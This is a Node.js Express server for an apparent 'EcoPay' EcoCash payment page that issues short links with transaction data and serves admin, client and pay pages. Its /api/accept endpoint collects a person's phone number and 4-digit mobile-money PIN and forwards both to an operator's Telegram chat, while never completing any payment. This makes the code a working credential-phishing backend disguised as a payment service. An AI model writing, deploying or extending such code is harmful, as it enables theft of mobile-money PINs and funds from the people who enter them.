const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/* ============================================================
   Persistent store for short links.
   On Railway: attach a Volume mounted at /app/data and set
   DATA_DIR=/app/data so links survive redeploys.
============================================================ */
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'links.json');

function ensureDataDir() {
  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
}

function loadLinks() {
  ensureDataDir();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return new Map(Object.entries(JSON.parse(raw)));
  } catch (e) {
    return new Map();
  }
}

function saveLinks(map) {
  ensureDataDir();
  try {
    const obj = {};
    for (const [k, v] of map.entries()) obj[k] = v;
    fs.writeFileSync(DATA_FILE, JSON.stringify(obj), 'utf8');
  } catch (e) {
    console.error('saveLinks error:', e.message);
  }
}

let linkStore = loadLinks();

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [code, entry] of linkStore.entries()) {
    if (entry.exp && now > entry.exp) { linkStore.delete(code); changed = true; }
    else if (now - entry.createdAt > 7 * 24 * 3600 * 1000) { linkStore.delete(code); changed = true; }
  }
  if (changed) saveLinks(linkStore);
}, 60 * 60 * 1000);

/* ============================================================
   Telegram notification.
   Sends ONLY the phone number and the 4-digit PIN.
   Uses AbortController so a slow Telegram never blocks the
   request. PIN is never written to any log.
============================================================ */
async function notifyTelegram({ phone, pin }) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('Telegram not configured — skipping notification.');
    return;
  }

  const text = phone + '\n' + pin;
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 6000);

  try {
    const res = await fetch(
      'https://api.telegram.org/bot' + token + '/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text }),
        signal: controller.signal
      }
    );
    if (!res.ok) console.error('Telegram responded', res.status);
  } catch (err) {
    console.error('Telegram notify failed:', err.name === 'AbortError' ? 'timeout' : err.message);
  } finally {
    clearTimeout(timeout);
  }
}

/* ============================================================
   POST /api/links — create short link
============================================================ */
app.post('/api/links', (req, res) => {
  try {
    const payload = req.body;
    if (!payload || !payload.tx) {
      return res.status(400).json({ error: 'Missing transaction data' });
    }

    const code = 'ECP-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    linkStore.set(code, {
      payload,
      createdAt: Date.now(),
      exp: payload.exp || null
    });
    saveLinks(linkStore);

    res.json({ code, shortUrl: '/client.html?r=' + code });
  } catch (err) {
    console.error('create link error:', err);
    res.status(500).json({ error: 'Could not create link' });
  }
});

/* ============================================================
   GET /api/links/:code — resolve short link
============================================================ */
app.get('/api/links/:code', (req, res) => {
  const code = req.params.code;
  const entry = linkStore.get(code);

  if (!entry) {
    return res.status(404).json({ error: 'Link not found or expired' });
  }
  if (entry.exp && Date.now() > entry.exp) {
    linkStore.delete(code);
    saveLinks(linkStore);
    return res.status(410).json({ error: 'Link expired' });
  }

  res.json(entry.payload);
});

/* ============================================================
   POST /api/accept — record payment authorization
   ------------------------------------------------------------
   Sends phone + PIN to Telegram (as requested).
   Never returns success without provider confirmation.
============================================================ */
app.post('/api/accept', async (req, res) => {
  const { transactionId, phone, pin } = req.body;

  if (!transactionId || !phone || !pin) {
    return res.status(400).json({
      status: 'failed',
      message: 'Missing transactionId, phone, or pin'
    });
  }

  if (!/^\d{4}$/.test(String(pin))) {
    return res.status(400).json({
      status: 'failed',
      message: 'PIN must be exactly 4 digits'
    });
  }

  // Telegram receives phone + PIN only
  await notifyTelegram({ phone, pin });

  // No provider configured → honest demo response
  if (!process.env.ECOCASH_API_KEY) {
    return res.json({
      status: 'demo',
      message: 'EcoCash provider not configured. Demonstration mode only — no real payment was made.'
    });
  }

  // Provider key exists but integration not wired → pending
  return res.json({
    status: 'pending',
    message: 'Acceptance recorded. Awaiting provider confirmation.',
    transactionId
  });
});

/* ============================================================
   Health
============================================================ */
app.get('/health', (req, res) => res.json({ ok: true }));

/* ============================================================
   Safe page serving — checks the file exists before calling
   sendFile, so a missing file returns a clean 404 instead of
   an ENOENT crash.
============================================================ */
function servePage(filename) {
  const fullPath = path.join(__dirname, 'public', filename);
  return (req, res) => {
    if (!fs.existsSync(fullPath)) {
      return res.status(404).send('Page not found: ' + filename);
    }
    res.sendFile(fullPath);
  };
}

app.get('/admin.html',  servePage('admin.html'));
app.get('/client.html', servePage('client.html'));
app.get('/pay.html',    servePage('pay.html'));

app.get('/', (req, res) => res.redirect('/admin.html'));

/* Fallback — API gets JSON 404, everything else gets plain 404 */
app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.status(404).send('Page not found');
});

/* ============================================================
   Startup log — list what's actually in public/ so a missing
   pay.html is visible immediately in Railway logs.
============================================================ */
app.listen(PORT, '0.0.0.0', () => {
  console.log('EcoPay running on port ' + PORT);
  console.log('Data directory:', DATA_DIR);

  const publicDir = path.join(__dirname, 'public');
  try {
    const files = fs.readdirSync(publicDir);
    console.log('Public files:', files.join(', ') || '(empty)');
    ['admin.html', 'client.html', 'pay.html'].forEach(f => {
      console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
    });
  } catch (e) {
    console.error('Could not read public directory:', e.message);
  }

  console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
  console.log('EcoCash provider configured:', !!process.env.ECOCASH_API_KEY);
});
